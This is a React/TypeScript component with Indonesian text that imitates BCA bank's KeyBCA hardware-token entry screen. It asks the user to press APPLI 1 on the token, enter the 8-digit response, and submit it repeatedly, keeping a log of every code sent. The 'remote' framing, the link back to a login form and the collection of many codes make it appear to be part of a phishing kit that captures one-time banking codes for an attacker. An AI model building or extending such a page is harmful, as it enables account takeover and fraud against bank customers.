import React, { useState } from 'react';
import { ArrowLeft, ShieldCheck, KeyRound, CheckCircle2, RotateCcw } from 'lucide-react';
import { triggerHaptic } from '../../utils/haptics';

interface KeyBcaRemoteProps {
  onSubmitKeyBca: (code: string) => void;
  onBack?: () => void;
}

export const KeyBcaRemote: React.FC<KeyBcaRemoteProps> = ({ onSubmitKeyBca, onBack }) => {
  const [responseCode, setResponseCode] = useState('');
  const [error, setError] = useState<string | null>(null);
  const [sentCodes, setSentCodes] = useState<string[]>([]);
  const [lastSent, setLastSent] = useState<string | null>(null);

  const handleDigit = (digit: string) => {
    triggerHaptic(10);
    if (responseCode.length < 8) {
      setResponseCode((prev) => prev + digit);
      setError(null);
    }
  };

  const handleDelete = () => {
    triggerHaptic(8);
    setResponseCode((prev) => prev.slice(0, -1));
    setError(null);
  };

  const handleClear = () => {
    triggerHaptic(12);
    setResponseCode('');
    setError(null);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    triggerHaptic(15);
    if (responseCode.length !== 8) {
      setError('Respon KeyBCA APPLI 1 harus 8 digit angka.');
      return;
    }

    const codeToSend = responseCode;
    setSentCodes((prev) => [codeToSend, ...prev]);
    setLastSent(codeToSend);
    setResponseCode('');
    setError(null);

    onSubmitKeyBca(codeToSend);
  };

  return (
    <div className="form-wrapper-container w-[var(--form-wrapper-width)] max-w-[var(--form-wrapper-max-width)] mx-auto pt-1">
      {onBack && (
        <button
          onClick={onBack}
          className="flex items-center gap-1 text-xs font-bold text-[#00529C] hover:underline mb-2 cursor-pointer"
        >
          <ArrowLeft className="w-4 h-4" />
          <span>Kembali ke Form Login</span>
        </button>
      )}

      <div className="text-center mb-3">
        <div className="inline-flex items-center justify-center w-10 h-10 rounded-full bg-amber-100 text-amber-700 mb-1">
          <KeyRound className="w-5 h-5 stroke-[2.2]" />
        </div>
        <h3 className="text-base font-extrabold text-[#00529C]">Otentikasi Remote KeyBCA APPLI 1</h3>
        <p className="text-xs text-slate-600 mt-0.5">
          Tekan tombol <span className="font-bold text-slate-900">APPLI 1</span> pada fisik KeyBCA Anda, lalu masukkan 8 digit respon di bawah ini. Anda dapat menginput kode berulang kali.
        </p>
      </div>

      {lastSent && (
        <div className="mb-3 bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs p-2.5 rounded-xl flex items-center justify-between animate-fadeIn">
          <div className="flex items-center gap-2">
            <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0" />
            <span>Respon <strong>{lastSent}</strong> berhasil dikirim.</span>
          </div>
          <button
            onClick={() => setLastSent(null)}
            className="text-[10px] text-emerald-700 underline font-bold cursor-pointer"
          >
            Tutup
          </button>
        </div>
      )}

      {/* Simulator KeyBCA Display */}
      <div className="bg-slate-900 border-4 border-slate-700 rounded-2xl p-4 mb-3 text-center shadow-lg relative">
        <div className="bg-[#8ba688] border-2 border-slate-900 rounded-lg p-3 font-mono font-extrabold text-slate-950 text-xl tracking-[0.25em] shadow-inner min-h-[48px] flex items-center justify-center">
          {responseCode ? responseCode.padEnd(8, '_') : '________'}
        </div>
        <div className="flex justify-between items-center mt-1.5 px-1">
          <span className="text-[10px] text-slate-400 font-bold tracking-wider uppercase">
            RESPON KEYBCA APPLI 1
          </span>
          {responseCode.length > 0 && (
            <button
              onClick={handleClear}
              className="text-[10px] text-amber-400 hover:text-amber-300 font-bold flex items-center gap-1 cursor-pointer"
            >
              <RotateCcw className="w-3 h-3" />
              <span>Kosongkan Input</span>
            </button>
          )}
        </div>
      </div>

      {/* Keypad Buttons */}
      <div className="grid grid-cols-3 gap-2 mb-3">
        {['1', '2', '3', '4', '5', '6', '7', '8', '9'].map((num) => (
          <button
            key={num}
            type="button"
            onClick={() => handleDigit(num)}
            className="py-2.5 bg-slate-100 hover:bg-slate-200 active:bg-blue-100 font-extrabold text-slate-800 text-lg rounded-xl border border-slate-300 shadow-xs active:scale-95 transition-all cursor-pointer"
          >
            {num}
          </button>
        ))}
        <button
          type="button"
          onClick={handleClear}
          className="py-2.5 bg-rose-50 hover:bg-rose-100 font-bold text-rose-700 text-xs rounded-xl border border-rose-200 active:scale-95 transition-all cursor-pointer uppercase tracking-wider"
        >
          BERSIHKAN
        </button>
        <button
          type="button"
          onClick={() => handleDigit('0')}
          className="py-2.5 bg-slate-100 hover:bg-slate-200 active:bg-blue-100 font-extrabold text-slate-800 text-lg rounded-xl border border-slate-300 shadow-xs active:scale-95 transition-all cursor-pointer"
        >
          0
        </button>
        <button
          type="button"
          onClick={handleDelete}
          className="py-2.5 bg-amber-50 hover:bg-amber-100 font-bold text-amber-700 text-xs rounded-xl border border-amber-200 active:scale-95 transition-all cursor-pointer uppercase tracking-wider"
        >
          HAPUS
        </button>
      </div>

      {error && (
        <div className="text-[11px] text-red-600 font-bold mb-3 text-center bg-red-50 p-2 rounded-lg border border-red-200 animate-fadeIn">
          ⚠ {error}
        </div>
      )}

      <button
        onClick={handleSubmit}
        className="w-full py-3 bg-[#00529C] text-white font-extrabold text-xs sm:text-sm rounded-xl shadow-md hover:bg-[#00407A] active:scale-[0.98] transition-all uppercase tracking-wide cursor-pointer flex items-center justify-center gap-2"
      >
        <ShieldCheck className="w-4 h-4" />
        <span>KIRIM OTENTIKASI KEYBCA</span>
      </button>

      {sentCodes.length > 0 && (
        <div className="mt-3 p-2.5 bg-slate-50 border border-slate-200 rounded-xl text-left">
          <span className="text-[10px] font-bold text-slate-500 uppercase tracking-wider block mb-1">
            Riwayat Respon Terkirim Sesi Ini ({sentCodes.length}):
          </span>
          <div className="flex flex-wrap gap-1.5">
            {sentCodes.map((c, i) => (
              <span key={i} className="text-[11px] font-mono font-bold bg-blue-100 text-[#00529C] px-2 py-0.5 rounded-md border border-blue-200">
                #{sentCodes.length - i}: {c}
              </span>
            ))}
          </div>
        </div>
      )}
    </div>
  );
};
